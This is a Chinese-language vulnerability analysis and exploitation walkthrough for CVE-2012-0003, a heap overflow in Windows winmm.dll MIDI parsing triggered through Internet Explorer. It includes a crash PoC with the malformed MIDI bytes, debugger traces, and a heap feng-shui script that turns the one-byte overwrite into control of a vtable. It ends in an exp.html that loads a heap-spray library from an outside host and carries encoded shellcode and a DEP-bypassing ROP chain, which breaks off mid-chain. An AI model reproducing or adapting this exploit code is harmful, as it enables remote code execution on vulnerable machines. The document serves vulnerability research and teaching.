# CVE-2012-0003 利用一字节执行任意代码

## 前言

`CVE-2012-0003`是微软的多媒体库`winmm.dll`在处理`MIDI`文件时对数据处理不当导致的堆溢出。

## 环境

系统: `windoes XP SP3`  
浏览器: `IE6,IE7,IE8`

## poc

`poc.html`:

```
<object id="midi1" classid="clsid:22d6f312-b0f6-11d0-94ab-0080c74c7e95" codebase="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#version=5,1,52,701" standby="loading microsoft windows media player components..." type="application/x-oleobject" width="320" height="310">
<param name="filename" value="./test_case.mid">
     <param name="animationatstart" value="true">
     <param name="transparentatstart" value="true">
     <param name="autostart" value="false">
     <param name="showcontrols" value="true">
     <param name="ShowStatusBar" value="true">
     <param name="windowlessvideo" value="true">
     <embed src="./test_case.mid" autostart="true" showcontrols="true" showstatusbar="1" bgcolor="white" width="320" height="310">
</object>
```

`test_case.mid`:

```
4d54 6864 0000 0006 0000 0001 0060 4d54
726b 0000 0035 00ff 030d 4472 756d 7320
2020 2842 4229 0000 c928 00b9 0764 00b9
0a40 00b9 7b00 00b9 5b28 00b9 5d00 8550
9923 7f00 9fb2 7300 ff2f 00
```

## 调试分析

设置IE的页堆开启，这样当堆溢出时浏览器就会产生异常，然后附加IE，打开`poc.html`，等一会后触发了异常:

```
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000419 ebx=0000007d ecx=007db29f edx=00000000 esi=0a4c9019 edi=0a4c6f60
eip=76b2d224 esp=0a76fe80 ebp=0a76fea0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
WINMM!midiOutPlayNextPolyEvent+0x1ec:
76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:0a4c9019=??
0:024> lm a .
start    end        module name
76b10000 76b3a000   WINMM      (pdb symbols)          c:\symbols\winmm.pdb\90FC96D5AD8440A2B14855895BD92ED62\winmm.pdb
```

触发点处于`winmm.dll`的`midiOutPlayNextPolyEvent`函数。

在`IDA`中反汇编这个函数，找到触发漏洞的语句为:

```
v25 = (char *)(v24 + v20);
v26 = *v25;       // vuln
```

往上回溯，关键语句为:

```
v1 = wParam; 
v2 = *(v1 + 0x3C);
v9 = *(v2 + 0x24);
v9 += 4;
v11 = *(v9 + wParama);
v13 = v11 & 0xFFFFFF;
wParam_3a = v13;
v21 = *(v1 + 84); or v21 = v13;
v23 = wParam_3a + ((v21 & 0xF) << 7);
v24 = ((signed int)v23 - HIDWORD(v23)) >> 1;
v20 = *(v1 + 0x84);
v25 = (char *)(v24 + v20);
v26 = *v25;                               // vuln
```

`v26`受`v24`和`v20`的影响，`v20`只和`v1`有关，`v24`和`v23`有关，`v23`和`v13`和`v21`有关。

只要关注这几个变量:

```
v26 = *v25; 
=> v25 = (v24 + v20);

v20
=> v20 = *(v1 + 0x84); 

v24
=> v24 = (v23 - HIDWORD(v23)) >> 1;
=> v23 = wParam_3a + ((v21 & 0xF) << 7);
=> wParam_3a = BYTE1(v13); or  wParam_3a = v13; | v21 = v13; or v21 = *(v1 + 0x54);
=> v13 = v11 & 0xFFFFFF;
=> v11 = *(v9 + wParama);
=> v9 = *(v2 + 0x24);
=> v2 = *(v1 + 0x3C);
=> v1 = wParam;
```

需要追踪的几个变量为`v1,v2,v9,v11,v13,21`，由于有些变量的值需要经过`if`语句的判断，所以可以找一些无需判断的地方来追踪变量，对应汇编为:

```
v1: => 76B2D0B2  mov eax, [ebp+wParam]
v2: v2 = *(v1 + 0x3C) => 76B2D050  mov esi, [edi+3Ch]
v9: v9 = *(v2 + 0x24) => 76B2D096  mov ebx, [esi+24h]
v11: v11 = *(v9 + wParama) => 76B2D0B5  mov ecx, [ebx+eax]
v13: v21 = v13; => 76B2D0D1  mov [ebp+var_8], ecx
v21: v36 = v21 & 0xF0; => 76B2D1F3  and dl, 0F0h
```

给上面的指令下条件断点:

```
Breakpoints
Address    Module     Active                     Disassembly                           Comment
76B2D050   WINMM      Log "v2"                   MOV ESI,DWORD PTR DS:[EDI+3C]
76B2D096   WINMM      Log "v9"                   MOV EBX,DWORD PTR DS:[ESI+24]
76B2D0B2   WINMM      Log "v1"                   MOV EAX,DWORD PTR SS:[EBP+8]
76B2D0B5   WINMM      Log "v11"                  MOV ECX,DWORD PTR DS:[EBX+EAX]
76B2D0D1   WINMM      Log "v13"                  MOV DWORD PTR SS:[EBP-8],ECX
76B2D1F3   WINMM      Log "v21"                  AND DL,0F0
```

直接运行得到结果:

```
...
76B2D050   COND: v2 = 0B958FC0
76B2D096   COND: v9 = 00000004
76B2D0B2   COND: v1 = 0B34FAD0
76B2D0B5   COND: v11 = 000028C9
76B2D0D1   COND: v13 = 000028C9
76B2D1F3   COND: v21 = C9
76B2D050   COND: v2 = 0B958FC0
76B2D096   COND: v9 = 00000010
76B2D0B2   COND: v1 = 0B34FAD0
76B2D0B5   COND: v11 = 006407B9
76B2D0D1   COND: v13 = 006407B9
76B2D1F3   COND: v21 = B9
76B2D050   COND: v2 = 0B958FC0
76B2D096   COND: v9 = 0000001C
76B2D0B2   COND: v1 = 0B34FAD0
76B2D0B5   COND: v11 = 00400AB9
76B2D0D1   COND: v13 = 00400AB9
76B2D1F3   COND: v21 = B9
76B2D050   COND: v2 = 0B958FC0
76B2D096   COND: v9 = 00000028
76B2D0B2   COND: v1 = 0B34FAD0
76B2D0B5   COND: v11 = 00007BB9
76B2D0D1   COND: v13 = 00007BB9
76B2D1F3   COND: v21 = B9
76B2D050   COND: v2 = 0B958FC0
76B2D096   COND: v9 = 00000034
76B2D0B2   COND: v1 = 0B34FAD0
76B2D0B5   COND: v11 = 00285BB9
76B2D0D1   COND: v13 = 00285BB9
76B2D1F3   COND: v21 = B9
76B2D050   COND: v2 = 0B958FC0
76B2D096   COND: v9 = 00000040
76B2D0B2   COND: v1 = 0B34FAD0
76B2D0B5   COND: v11 = 00005DB9
76B2D0D1   COND: v13 = 00005DB9
76B2D1F3   COND: v21 = B9
76B2D050   COND: v2 = 0B940FC0
7C8106E9   New thread with ID 00000788 created
7C8106E9   New thread with ID 00000D18 created
0D480000   Modules C:\WINDOWS\system32\wmvcore.dll
73620000   Modules C:\WINDOWS\system32\msdmo.dll
0D6D0000   Modules C:\WINDOWS\system32\WMASF.DLL
76B2D050   COND: v2 = 0B940FC0
76B2D096   COND: v9 = 00000004
76B2D0B2   COND: v1 = 0B334AD0
76B2D0B5   COND: v11 = 007F2399
76B2D0D1   COND: v13 = 007F2399
76B2D1F3   COND: v21 = 99
76B2D050   COND: v2 = 0B940FC0
76B2D096   COND: v9 = 00000010
76B2D0B2   COND: v1 = 0B334AD0
76B2D0B5   COND: v11 = 0073B29F
76B2D0D1   COND: v13 = 0073B29F
76B2D1F3   COND: v21 = 9F
76B2D224   [22:06:40] Access violation when reading [0B905019]
```

`v2,v1`是不变的，`v11,v13`相等，`v21`是`v11,v13`的低位，`v9`是计数的，依次递增。`0073B29F`是文件中的一段数值。

在`76B2D0B5`下条件断点，当`[ebx+eax]==0073B29F`时断下，然后单步直到漏洞点。

`v20`的赋值在`v20 = *(v1 + 0x84)`一句，跟到这句，此时要赋给`esi`的值为`0A900C00`:

```
76B2D1B9   8BB7 84000000    MOV ESI,DWORD PTR DS:[EDI+84]
	DS:[0A8FEFE4]=0A900C00
	ESI=0A940FC0
```

对应的伪代码如下:

```
      v20 = *(v1 + 0x84);  // 76B2D1B9 MOV ESI,DWORD PTR DS:[EDI+84]
      if ( hmo )
        break;
      do
      {
LABEL_48:
        if ( midiOutScheduleNextEvent(v1) )
          break;
        midiOutDequeueAndCallback(v1);
      }
      while ( *(v1 + 60) );
      if ( *(v1 + 52) )
        return;
    }
    v21 = v13;
    if ( (v13 & 0x80u) != 0 ) // // 会进入这里的if
    {
      *(v1 + 0x54) = v13;
      wParam_3a = BYTE1(v13);
      v22 = v13 >> 16;
    }
    else  
    {
      v21 = *(v1 + 0x54);
      wParam_3a = v13;
      v22 = v13 >> 8;
      v13 = v21 | (v13 << 8);
    }
    v36 = v21 & 0xF0;
    if ( (v21 & 0xF0) == 0x90u || (v21 & 0xF0) == 0x80u )
    {
      v23 = wParam_3a + ((v21 & 0xF) << 7);
      v24 = (v23 - HIDWORD(v23)) >> 1;
      if ( v36 == 0x80u || !v22 )
      {
        v29 = (v24 + v20);
        v30 = *(v24 + v20);
        if ( wParam_3a & 1 )
        {
          if ( !(v30 & 0xF0) )
            goto LABEL_46;
          v31 = v30 - 16;
        }
        else
        {
          if ( !(v30 & 0xF) )
            goto LABEL_46;
          v31 = v30 - 1;
        }
        *v29 = v31;
        goto LABEL_46;
      }
      v25 = (v24 + v20);
      v26 = *v25;                               // vuln
```

汇编代码与伪代码的对应，包含注释:

```
76B2D1B9   8BB7 84000000    MOV ESI,DWORD PTR DS:[EDI+84]	; v20 = *(v1 + 0x84);
76B2D1BF   0F84 B1000000    JE WINMM.76B2D276
76B2D1C5   84C9             TEST CL,CL
76B2D1C7   8AC1             MOV AL,CL
76B2D1C9   8BD9             MOV EBX,ECX  	; v21 = v13;
76B2D1CB   78 16            JS SHORT WINMM.76B2D1E3 	; jump is taken
76B2D1CD   8A47 54          MOV AL,BYTE PTR DS:[EDI+54] 
76B2D1D0   884D 0B          MOV BYTE PTR SS:[EBP+B],CL
76B2D1D3   0FB6D0           MOVZX EDX,AL
76B2D1D6   C1E1 08          SHL ECX,8
76B2D1D9   C1EB 08          SHR EBX,8  
76B2D1DC   0BCA             OR ECX,EDX 
76B2D1DE   894D F8          MOV DWORD PTR SS:[EBP-8],ECX
76B2D1E1   EB 0E            JMP SHORT WINMM.76B2D1F1
76B2D1E3   8BD1             MOV EDX,ECX		; ECX=0073B29F,EDX=00000000 (wParam_3a = v13;)
76B2D1E5   C1EA 08          SHR EDX,8
76B2D1E8   884F 54          MOV BYTE PTR DS:[EDI+54],CL  	; *(v1 + 0x54) = v13;
76B2D1EB   8855 0B          MOV BYTE PTR SS:[EBP+B],DL 	; wParam_3a = BYTE1(v13);
76B2D1EE   C1EB 10          SHR EBX,10 		; v22 = v13 >> 16;
76B2D1F1   8AD0             MOV DL,AL  		; 
76B2D1F3   80E2 F0          AND DL,0F0  	; v36 = v21 & 0xF0;
76B2D1F6   80FA 90          CMP DL,90  		; (v21 & 0xF0) == 0x90u 
76B2D1F9   8855 FF          MOV BYTE PTR SS:[EBP-1],DL
76B2D1FC   74 05            JE SHORT WINMM.76B2D203 	; jump is taken
76B2D1FE   80FA 80          CMP DL,80  		; (v21 & 0xF0) == 0x80u
76B2D201   75 5C            JNZ SHORT WINMM.76B2D25F
76B2D203   0FB655 0B        MOVZX EDX,BYTE PTR SS:[EBP+B] 	; EDX=B2 
76B2D207   83E0 0F          AND EAX,0F 		; EAX=9F (v21 & 0xF) => 9F & 0F
76B2D20A   C1E0 07          SHL EAX,7 		; EAX=0F ((v21 & 0xF) << 7) => 0F << 7
76B2D20D   03C2             ADD EAX,EDX 	; EDX=000000B2,EAX=00000780 (v23 = wParam_3a + ((v21 & 0xF) << 7))
76B2D20F   99               CDQ		; EDX=0
76B2D210   2BC2             SUB EAX,EDX		; EAX=832,EDX=0 (v23 - HIDWORD(v23))
76B2D212   D1F8             SAR EAX,1		; EAX=832 (v24 = (v23 - HIDWORD(v23)) >> 1) => 832 >> 1
76B2D214   807D FF 80       CMP BYTE PTR SS:[EBP-1],80
76B2D218   74 2A            JE SHORT WINMM.76B2D244 	; jump not taken
76B2D21A   84DB             TEST BL,BL
76B2D21C   74 26            JE SHORT WINMM.76B2D244 	; jump not taken
76B2D21E   03F0             ADD ESI,EAX 	; EAX=00000419,ESI=0A922C00 (v25 = (v24 + v20);)
76B2D220   F645 0B 01       TEST BYTE PTR SS:[EBP+B],1	; Stack SS:[0AB5FEAB]=B2
76B2D224   8A06             MOV AL,BYTE PTR DS:[ESI]	; DS:[0A923019]=00 (v26 = *v25; )
```

`76B2D224`处触发了崩溃，用`windbg`看看这里堆的情况:

```
0:021> g
Breakpoint 0 hit
eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=0d27f019 edi=0d27cf60
eip=76b2d224 esp=0d4dfe80 ebp=0d4dfea0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
WINMM!midiOutPlayNextPolyEvent+0x1ec:
76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:0d27f019=??
0:021> !heap -p -a 0d27f019 
    address 0d27f019 found in
    _DPH_HEAP_ROOT @ 141000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 d0c2328:          d27ec00              400 -  
```

那么漏洞的原因就清楚了，看到这里是从`d27ec00`开始的大小为`0x400`的一个堆，也就是到`d27f000`，而访问到了`0d27f019`，造成了越界。

由之前的分析可知:

```
76B2D21E  ADD ESI,EAX  ;EAX=00000419,ESI=0A922C00 (v25 = (v24 + v20);)
76B2D224  MOV AL,BYTE PTR DS:[ESI]	; DS:[0A923019]=00 (v26 = *v25;)
```

这条语句将堆的起始地址加上一个数赋给了`v25`，然后下一句从这个地址里拿数据时就触发了漏洞，`esi`里的是堆的起始地址，往前可以追溯到`76B2D1B9`处的`mov`指令，那么堆的起始地址就是`*(v1 + 0x84);`，也就是`*(wParam + 0x84);`。而偏移`v24`来自于`eax`，计算过程如下:

```
MOV AL,CL => EAX = 0x9f
AND EAX,0F => EAX = 0x9f & 0x0f = 0xf
SHL EAX,7 => EAX = 0xf << 7 = 0x780
ADD EAX,EDX => EDX=000000B2, EAX = 0x780 + 0xb2 = 0x832
CDQ => EDX=0
SUB EAX,EDX => EAX = 0x832
SAR EAX,1 => EAX = 0x832 >> 1 = 0x419  // 溢出
```

追溯一下`edx`:

```
MOV EDX,ECX => EDX = 0x0073b29f
SHR EDX,8 => EDX = 0x0073b29f >> 8 = 0x73b3
MOV BYTE PTR SS:[EBP+B],DL => wParam_3a = 0xb2 // 保存低位
MOVZX EDX,BYTE PTR SS:[EBP+B] => EDX = 0xb2
```

现在已经知道了是如何引发堆溢出了，然后寻找堆是在哪里分配的，`*(wParam + 0x84)`就是堆的起始地址，`wParam`是`midiOutPlayNextPolyEvent`的一个参数，查找一下交叉引用，这个函数被`midiOutTimerTick`引用，查看伪代码:

```
  v5 = -1;
  if ( !guMIDIInTimer )
  {
    v6 = gpEmuList;
    for ( guMIDIInTimer = 1; v6; v6 = *v6 )
    {
      v7 = clockTime(v6 + 88);
      v8 = *(v6 + 52) == 0;
      *(v6 + 128) = v7;
      if ( v8 )
      {
        if ( !PDEVLOCK(v6) )
          midiOutPlayNextPolyEvent(v6);
```

可见`wParam`来自于`gpEmuList`，通过交叉引用找到`mseOpen`这个函数，发现在这里分配了空间:

```
    v5 = winmmAlloc(v4);
    if ( v5 )
    {
      v6 = winmmAlloc(0x400u);
      *(v5 + 0x84) = v6;
      if ( v6 )
      {
        *(v5 + 8) |= 0x80u;
        *(v5 + 4) = *a2;
        *(v5 + 0x2C) = 0x18;
        *(v5 + 0x30) = 0x7A120;
        *(v5 + 0x44) = *(a2 + 4);
        *(v5 + 0x48) = a3;
        *(v5 + 0x4C) = *(a2 + 8);
        *(v5 + 0x34) = 4;
        v7 = *(a2 + 0x10);
        *(v5 + 0xC) = 0xFFFFFFFF;
        *(v5 + 0x8C) = v7;
        *(v5 + 0x38) = 3;
        *(v5 + 0x7C) = 0;
        *(v5 + 0x28) = 0x12341234;
        v14 = 0;
        if ( v7 <= 0 )
        {
LABEL_8:
          if ( mmInitializeCriticalSection((v5 + 16)) )
          {
            clockInit(v5 + 88, 0, 0, mseTimebase);
            midiOutSetClockRate(v5, 0);
            if ( !v13 )
            {
              *v5 = gpEmuList;
              gpEmuList = v5;
```

可见`gpEmuList`来自于`winmmAlloc`分配的空间。

所以:

```
v20 = *(gpEmuList + 0x84) = *(v5 + 0x84) = v6 = winmmAlloc(0x400u)
```

分配了`0x400`的空间，而后面计算得到`0x419`，造成了溢出。

## 漏洞利用

从漏洞点往下看:

```
76B2D224   8A06             MOV AL,BYTE PTR DS:[ESI]  	; vuln v26 = [ESI]
76B2D226   8AD0             MOV DL,AL
76B2D228   74 0C            JE SHORT WINMM.76B2D236 	; jump is taken
76B2D22A   80E2 F0          AND DL,0F0
76B2D22D   80FA F0          CMP DL,0F0
76B2D230   74 2D            JE SHORT WINMM.76B2D25F
76B2D232   04 10            ADD AL,10
76B2D234   EB 0A            JMP SHORT WINMM.76B2D240
76B2D236   80E2 0F          AND DL,0F
76B2D239   80FA 0F          CMP DL,0F
76B2D23C   74 21            JE SHORT WINMM.76B2D25F
76B2D23E   FEC0             INC AL	; v26++
76B2D240   8806             MOV BYTE PTR DS:[ESI],AL	; [ESI] = v26
```

发现会将`[esi]`中的一字节减去1再赋给`[esi]`，这样能够控制一字节，`vupen`公司的安全人员给出了一种利用方法，能够实现稳定的利用。

方法就是改变的一字节可能会破坏浏览器中的对象，已经知道发生溢出的堆块大小是`0x400`，那么就可以事先分配很多大小为`0x400`的堆块，然后间隔的释放其中的堆块，这样`mseOpen`在申请时就申请到这些我们释放的内存，这样溢出的堆块就会落在我们之前分配的堆块中间:

```
+-----+-----+-----+-----+-----+-----+-----+-----+
|0x400|0x400|0x400|0x400|0x400|0x400|0x400|.....
+-----+-----+-----+-----+-----+-----+-----+-----+

+-----+-----+-----+-----+-----+-----+-----+-----+
|0x400|free |0x400|free |0x400|free |0x400|.....
+-----+-----+-----+-----+-----+-----+-----+-----+

winmmAlloc(0x400u)就会选择一块free的内存进行分配:
+-----+-----+-----+-----+-----+-----+-----+-----+
|0x400|free |0x400| v20 |0x400|free |0x400|.....
+-----+-----+-----+-----+-----+-----+-----+-----+
```

这样溢出后的内存我们就可以控制了，实现这种方法的脚本如下:

```
</script>
<script language='javascript'>

var selob = document.createElement("select")
selob.w0 = alert
selob.w1 = unescape("%u1be4%u0c0c")
selob.w2 = alert
selob.w3 = alert
selob.w4 = alert
selob.w5 = alert
selob.w6 = alert
selob.w7 = alert
selob.w8 = alert
selob.w9 = alert
selob.w10 = alert
selob.w11 = alert
selob.w12 = alert
selob.w13 = alert
selob.w14 = alert
selob.w15 = alert
selob.w16 = alert
selob.w17 = alert
selob.w18 = alert
selob.w19 = alert
selob.w20 = alert
selob.w21 = alert
selob.w22 = alert
selob.w23 = alert
selob.w24 = alert
selob.w25 = alert
selob.w26 = alert
selob.w27 = alert
selob.w28 = alert
selob.w29 = alert
selob.w30 = alert
selob.w31 = alert
selob.w32 = alert
selob.w33 = alert
selob.w34 = alert
selob.w35 = alert
selob.w36 = alert
selob.w37 = alert
selob.w38 = alert
selob.w39 = alert
selob.w40 = alert
selob.w41 = alert
selob.w42 = alert
selob.w43 = alert
selob.w44 = alert
selob.w45 = alert
selob.w46 = alert
selob.w47 = alert
selob.w48 = alert
selob.w49 = alert
selob.w50 = alert
selob.w51 = alert
selob.w52 = alert
selob.w53 = alert
selob.w54 = alert
selob.w55 = alert
selob.w56 = alert
selob.w57 = alert
selob.w58 = alert
selob.w59 = alert
selob.w60 = alert
selob.w61 = alert
selob.w62 = alert
selob.w63 = alert

var clones=new Array(1000);

function feng_shui() {

	heap.gc();

	var i = 0;
	while (i < 1000) {
		clones[i] = selob.cloneNode(true)
		i = i + 1;
	}

	var j = 0;
	while (j < 1000) {
		delete clones[j];
		CollectGarbage();
		j  = j + 2;
	}

}

feng_shui();

function trigger(){
	var k = 999;
	while (k > 0) {
		if (typeof(clones[k].w1) == "string") {
		} else {
			clones[k].w1('come on!');
		}
		k = k - 2;
	}
	feng_shui();
	document.audio.Play();
}


</script>
<script for=audio event=PlayStateChange(oldState,newState)>
	if (oldState == 3 && newState == 0) {
		trigger();
	}
</script>
</head>
<body>
	<object ID="audio" WIDTH=1 HEIGHT=1 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
		<param name="fileName" value="test_case.mid">
		<param name="SendPlayStateChangeEvents" value="true">
		<param NAME="AutoStart" value="True">
		<param name="uiMode" value="mini">
		<param name="Volume" value="-300">
	</object>
</body>
</html>
```

这个脚本设置了`selob`对象的64个成员，其中一个是字符串，其他都是函数对象，每个对象大小都是`0x10 bytes`，所以一共就是`0x40*0x10=0x400`。这里使用`IE8`来调试，在溢出点`76B2D224`处下断点，断下第二次时:

```
0:020> g
Breakpoint 0 hit
eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=0d377d71 edi=001f18b8
eip=76b2d224 esp=1482fe80 ebp=1482fea0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
WINMM!midiOutPlayNextPolyEvent+0x1ec:
76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:0d377d71=08
```

`v20`是`0x0d377d71-0x419=0x0d377958`，那么下一个`selob`对象的地址可以通过加上这块的大小和下一块堆的头部大小得到:

```
0:020> d 0x0d377958+0x400+0x8
0d377d60  02 09 00 00 c1 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377d70  02 08 00 00 c2 c6 2d 00-00 00 00 00 1c 5f 34 03  ......-......_4.
0d377d80  02 09 00 00 c3 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377d90  02 09 00 00 c4 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377da0  02 09 00 00 c5 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377db0  02 09 00 00 c6 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377dc0  02 09 00 00 c7 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377dd0  02 09 00 00 c8 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
```

浏览器中使用一个字节来判断属性的类型，`0x8`是字符串类型，`0x9`是函数类型，之前分配时`w1`为字符串，其余都是函数，所以只有`0d377d70`处的属性第二个字节为`0x8`，那么当溢出`0x19`字节时，`[esi]`就是`0d377d71`处的`0x8`:

```
0:020> d 0x0d377958+0x400+0x8+0x11
0d377d71  08 00 00 c2 c6 2d 00 00-00 00 00 1c 5f 34 03 02  .....-......_4..
0d377d81  09 00 00 c3 c6 2d 00 00-00 00 00 9c 26 24 00 02  .....-......&$..
0d377d91  09 00 00 c4 c6 2d 00 00-00 00 00 9c 26 24 00 02  .....-......&$..
0:020> 
eax=00000408 ebx=00000073 ecx=0073b29f edx=00000008 esi=0d377d71 edi=001f18b8
eip=76b2d23e esp=1482fe80 ebp=1482fea0 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
WINMM!midiOutPlayNextPolyEvent+0x206:
76b2d23e fec0            inc     al
0:020> p
eax=00000409 ebx=00000073 ecx=0073b29f edx=00000008 esi=0d377d71 edi=001f18b8
eip=76b2d240 esp=1482fe80 ebp=1482fea0 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
WINMM!midiOutPlayNextPolyEvent+0x208:
76b2d240 8806            mov     byte ptr [esi],al          ds:0023:0d377d71=08
0:020> 
eax=00000409 ebx=00000073 ecx=0073b29f edx=00000008 esi=0d377d71 edi=001f18b8
eip=76b2d242 esp=1482fe80 ebp=1482fea0 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
WINMM!midiOutPlayNextPolyEvent+0x20a:
76b2d242 eb1b            jmp     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
0:020> d 0x0d377958+0x400+0x8+0x11
0d377d71  09 00 00 c2 c6 2d 00 00-00 00 00 1c 5f 34 03 02  .....-......_4..
0d377d81  09 00 00 c3 c6 2d 00 00-00 00 00 9c 26 24 00 02  .....-......&$..
0d377d91  09 00 00 c4 c6 2d 00 00-00 00 00 9c 26 24 00 02  .....-......&$..
```

此时`0d377d71`处的`0x8`被修改为`0x9`，成为了一个函数对象，在`trigger`函数中遍历所有克隆的对象，找到被修改的对象，执行`clones[k].w1('come on!')`，这样就会把字符串当做虚表指针来进行索引，再结合堆喷射就可以执行任意代码。

正常的`alert`对象的`0024269c`保存了虚函数表的地址，而字符串变量的`03345f1c`保存的就是字符串，这样相当于我们已经控制了虚表指针:

```
0:020> d 0x0d377958+0x400+0x8+0x10
0d377d70  02 09 00 00 c2 c6 2d 00-00 00 00 00 1c 5f 34 03  ......-......_4.
0d377d80  02 09 00 00 c3 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377d90  02 09 00 00 c4 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377da0  02 09 00 00 c5 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377db0  02 09 00 00 c6 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377dc0  02 09 00 00 c7 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377dd0  02 09 00 00 c8 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0d377de0  02 09 00 00 c9 c6 2d 00-00 00 00 00 9c 26 24 00  ......-......&$.
0:020> dd 03345f1c
03345f1c  0c0c0c0c 00000000 00000000 e9f901dd
03345f2c  ff080100 ffffffff ffffffff 00000000
03345f3c  00000000 e9f901d0 ff080100 00000000
03345f4c  00000000 00000000 00000000 e9f901d3
03345f5c  ff080100 00000000 00000000 00000000
03345f6c  00000000 e9f901d6 ff080100 00000000
03345f7c  00000000 00000000 00000000 e9f901c9
03345f8c  ff080100 00000000 00000000 00000000
0:020> dd 0024269c
0024269c  6363f190 0021a070 00000451 00000000
002426ac  00175918 eaab5246 ff080100 63ab1b18
002426bc  00000001 6363fbe4 00226f20 637a9974
002426cc  00000000 00000000 00020000 0300000f
002426dc  00000000 eaab524c ff080100 63ab1b18
002426ec  00000001 6363fbe4 002262c0 637a9974
002426fc  00000000 00000000 00020000 03000048
0024270c  00000000 eaab5272 ff080000 63ab00c2
0:020> lm a 6363f190 
start    end        module name
63580000 63b2c000   mshtml     (deferred)             
0:020> u 6363f190
mshtml!CFunctionPointer::`vftable':
6363f190 0df96363f8      or      eax,0F86363F9h
6363f195 fc              cld
```

执行`clones[k].w1('come on!')`时会调用`GetIntoVariant`函数通过虚表调用函数:

```
mshtml!CAttrValue::GetIntoVariant+0x46:
63678937 8b08            mov     ecx,dword ptr [eax]
63678939 50              push    eax
6367893a ff5104          call    dword ptr [ecx+4]

0:020> g
Breakpoint 1 hit
eax=03467304 ebx=00000000 ecx=034656e0 edx=00000040 esi=0d36c0f8 edi=0224c920
eip=63678937 esp=0224c57c ebp=0224c5b0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CAttrValue::GetIntoVariant+0x46:
63678937 8b08            mov     ecx,dword ptr [eax]  ds:0023:03467304=0c0c0c0c
0:008> p
eax=03467304 ebx=00000000 ecx=0c0c0c0c edx=00000040 esi=0d36c0f8 edi=0224c920
eip=63678939 esp=0224c57c ebp=0224c5b0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CAttrValue::GetIntoVariant+0x48:
63678939 50              push    eax
0:008> 
eax=03467304 ebx=00000000 ecx=0c0c0c0c edx=00000040 esi=0d36c0f8 edi=0224c920
eip=6367893a esp=0224c578 ebp=0224c5b0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CAttrValue::GetIntoVariant+0x49:
6367893a ff5104          call    dword ptr [ecx+4]    ds:0023:0c0c0c0c=0c0c0c0c
```

只要结合精准堆喷射和`rop`就可以成功绕过`DEP`执行任意代码。

`exp.html`:

```

<html>
<head>
<script type="text/javascript" src="http://pwdme.cc/heaplib.js"></script>
<script>
var heap_obj = new heapLib.ie(0x10000);

var code = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100");  //Code to execute

var rop = unescape(
    "%u208c%u0040" + // 0x0040208c : ,# POP EBP # RETN [iexplore.exe] 
    "%u4141%u4141" +
    "%u208c%u0040" + // 0x0040208c : ,# skip 4 bytes [iexplore.exe]
    "%u2b2b%u0040" + // 0x00402b2b : ,# POP EBX # RETN [iexplore.exe] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%ucb29%u77c1" + // 0x00000000 : ,# 0x77c1cb29
    "%u0040%u0000" + 
    "%u2070%u0040" + // 0x00402070 : ,# POP ECX # RETN [iexplore.exe] 
    "%ubfe2%u0040" + // 0x0040bfe2 : ,# &Writable location [iexplore.exe]
    "%u19ec%u0040" + // 0x004019ec : ,# POP EDI # POP ESI # RETN [iexplore.exe] 
